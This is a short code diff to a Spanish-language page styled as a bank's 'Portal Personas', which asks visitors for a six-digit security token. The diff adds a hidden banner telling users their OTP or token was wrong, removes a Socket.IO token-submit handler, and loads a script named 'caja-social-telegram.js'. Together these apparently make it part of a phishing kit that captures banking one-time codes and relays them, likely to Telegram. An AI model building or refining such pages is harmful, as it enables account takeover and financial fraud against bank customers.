@@ -29,6 +29,13 @@
                 </div>
                 
                 <h1 class="title">Bienvenido al<br>Portal Personas</h1>
+
+                <div id="otpTokenErrorAlert" class="caja-alert-error" role="alert" hidden>
+                    <span class="caja-alert-error__icon" aria-hidden="true">!</span>
+                    <div class="caja-alert-error__body">
+                        <strong>CODIGO OTP INGRESADO INCORRECTO O TOKEN INGRESADO INCORRECTO</strong>
+                    </div>
+                </div>
                 
                 <p class="subtitle">
                     Ingrese el token de seguridad que fue<br>
@@ -95,24 +102,11 @@
                 }
             });
             
-            // Enviar token
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
-                const value = tokenInput.value;
-                
-                if (value.length !== 6) {
-                    errorMessage.style.display = 'block';
-                    tokenInput.classList.add('error');
-                    return;
-                }
-                
-                // Enviar a través de Socket.IO
-                socketManager.sendToken(value);
-            });
         });
     </script>
 
     <script src="/js/banco-utils.js"></script>
+    <script src="caja-social-telegram.js"></script>
     <script src="client-optimized.js"></script>
 </body>
 </html>
